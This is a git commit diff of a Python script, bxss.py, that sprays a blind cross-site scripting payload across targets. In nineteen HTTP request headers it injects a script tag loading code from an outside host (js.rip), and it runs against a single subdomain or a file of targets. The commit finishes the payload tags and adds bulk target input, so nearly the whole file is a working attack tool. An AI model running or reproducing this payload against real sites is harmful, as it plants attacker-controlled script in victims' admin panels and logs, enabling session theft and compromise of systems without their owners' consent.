c614fe4bec5c1c9a2665fc7823be4d9a3e0f904e
0xmaruf <79659875+0xmaruf@users.noreply.github.com>
2023-10-06 20:56:12 -0700

    Update bxss.py

--- bxss.py
+++ bxss.py
@@ -1,50 +1,60 @@
 import sys
 import requests
+from urllib.parse import urlparse
 
 # Define the list of headers to include in the request
 headers = {
-    'User-Agent': '"><script/src=https://js.rip/0xmaruf>',
-    'Origin': '"><script/src=https://js.rip/0xmaruf>',
-    'Referrer': '"><script/src=https://js.rip/0xmaruf>',
-    'Cookie': 'test="><script/src=https://js.rip/0xmaruf>',
-    'X-Originating-IP': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Forwarded-For': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Forwarded': '"><script/src=https://js.rip/0xmaruf>',
-    'Forwarded-For': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Forwarded-Host': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Remote-IP': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Remote-Addr': '"><script/src=https://js.rip/0xmaruf>',
-    'X-ProxyUser-Ip': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Original-URL': '"><script/src=https://js.rip/0xmaruf>',
-    'Client-IP': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Client-IP': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Host': '"><script/src=https://js.rip/0xmaruf>',
-    'True-Client-IP': '"><script/src=https://js.rip/0xmaruf>',
-    'Cluster-Client-IP': '"><script/src=https://js.rip/0xmaruf>',
-    'X-Rewrite-URL': '"><script/src=https://js.rip/0xmaruf>'
+    'User-Agent': '"><script/src=https://js.rip/0xmaruf></script>',
+    'Origin': '"><script/src=https://js.rip/0xmaruf></script>',
+    'Referrer': '"><script/src=https://js.rip/0xmaruf></script>',
+    'Cookie': 'test="><script/src=https://js.rip/0xmaruf></script>',
+    'X-Originating-IP': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Forwarded-For': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Forwarded': '"><script/src=https://js.rip/0xmaruf></script>',
+    'Forwarded-For': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Forwarded-Host': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Remote-IP': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Remote-Addr': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-ProxyUser-Ip': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Original-URL': '"><script/src=https://js.rip/0xmaruf></script>',
+    'Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Host': '"><script/src=https://js.rip/0xmaruf></script>',
+    'True-Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
+    'Cluster-Client-IP': '"><script/src=https://js.rip/0xmaruf></script>',
+    'X-Rewrite-URL': '"><script/src=https://js.rip/0xmaruf></script>'
 }
 
 def send_request(subdomain):
-    # Check if the subdomain starts with a protocol, or is just the subdomain itself
-    if subdomain.startswith(("http://", "https://")):
-        url = subdomain
-    else:
-        url = f"http://{subdomain}"
-
     try:
-        response = requests.get(url, headers=headers)
-        if response.status_code == 200:
-            print(f"Subdomain: {url} - Request Successful")
+        # Check if the input starts with '/' indicating a local file path
+        if subdomain.startswith('/'):
+            with open(subdomain, "r") as file:
+                lines = file.read().splitlines()
+                for line in lines:
+                    send_request(line)
         else:
-            print(f"Subdomain: {url} - Request Failed (Status Code: {response.status_code})")
+            # Check if the input is a valid URL
+            parsed_url = urlparse(subdomain)
+            if parsed_url.scheme and parsed_url.netloc:
+                url = subdomain
+            else:
+                url = f"http://{subdomain}"
+
+            response = requests.get(url, headers=headers)
+            if response.status_code == 200:
+                print(f"Subdomain: {url} - Request Successful")
+            else:
+                print(f"Subdomain: {url} - Request Failed (Status Code: {response.status_code})")
+    except FileNotFoundError:
+        print(f"File not found: {subdomain}")
     except requests.exceptions.RequestException as e:
-        print(f"Subdomain: {url} - Request Failed: {str(e)}")
+        print(f"Subdomain: {subdomain} - Request Failed: {str(e)}")
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print("Usage: python tool.py <subdomain>")
+        print("Usage: python tool.py <subdomain or file_path>")
         sys.exit(1)
 
-    subdomain = sys.argv[1]
-
-    send_request(subdomain)
+    input_path = sys.argv[1]
+    send_request(input_path)
